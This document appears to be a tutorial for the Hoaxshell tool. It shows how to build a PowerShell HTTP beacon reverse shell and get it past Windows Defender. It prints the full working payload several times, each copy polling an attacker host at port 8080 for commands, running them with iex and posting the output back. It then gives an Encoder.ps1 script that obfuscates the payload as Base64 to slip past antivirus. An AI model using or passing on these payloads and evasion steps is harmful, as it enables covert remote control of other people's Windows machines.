Refrence: [Hoaxshell](https://github.com/t3l3machus/hoaxshell)
- A Windows reverse shell payload generator and handler that abuses the http(s) protocol to establish a beacon-like reverse shell.
- [Live Tutorial](https://youtu.be/iElVfagdCD4?si=_42YOWV4nTvKtg2e)


# Windows 11 Endpoint

1. Launch PowerShell, and run the payload you have copied. You should get the error message below:

``` Powershell
At line:1 char:1
+ $s='<ATTACKER_IP>:8080';$i='9187fd93-ad5dffe2-4e843b87';$p='http://' ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

2. Next, disable real-time and cloud-delivered protection in Windows security settings and run the payload again. This time, a shell will be created successfully on the attacker endpoint.

## Testing obfuscated hoaxshell payloads

For this test, enable real-time protection and cloud-delivered protection in Windows security settings on Windows 11. Exit any shells created on the attacker endpoint.

``` Python
python3 hoaxshell.py -s <ATTACKER_IP> -r -H "Authorization"
```

We Should Get Output like this:

``` Text
$s='<ATTACKER_IP>:8080';$i='5f8a6f53-558b0938-f763f78c';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/5f8a6f53 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/558b0938 -Headers @{"Authorization"=$i}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/f763f78c -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

2.  Edit a copy of the payload by replacing all mentions of the variable $i with its value declared in the payload, and delete the variable declaration from the payload as shown below.

``` Text
$s='<ATTACKER_IP>:8080';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/5f8a6f53 -Headers @{"Authorization"='5f8a6f53-558b0938-f763f78c'};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/558b0938 -Headers @{"Authorization"='5f8a6f53-558b0938-f763f78c'}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/f763f78c -Method POST -Headers @{"Authorization"='5f8a6f53-558b0938-f763f78c'} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
```

# Windows Endpoint Exploitation

1. Windows disables running scripts by default, you can enable running scripts by executing below command on a PowerShell terminal with administrator privileges:

```Powershell
set-executionpolicy remotesigned
```

2. Create a PowerShell script  **Encoder.ps1** to encode the edited payload into a valid PowerShell Base64 format:

```PowerShell
$command = @'
<INSERT THE PAYLOAD>
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -encodedCommand $encodedCommand
```

3. Replace **<INSERT THE PAYLOAD>** with the payload from step 2:

```PowerShell
$command = @'
$s='<ATTACKER_IP>:8080';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/5f8a6f53 -Headers @{"Authorization"='5f8a6f53-558b0938-f763f78c'};while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/558b0938 -Headers @{"Authorization"='5f8a6f53-558b0938-f763f78c'}).Content;if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/f763f78c -Method POST -Headers @{"Authorization"='5f8a6f53-558b0938-f763f78c'} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}
'@
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -encodedCommand $encodedCommand
```

4. Execute the saved PowerShell script:

```PowerShell
>.\Encoder.ps1
```
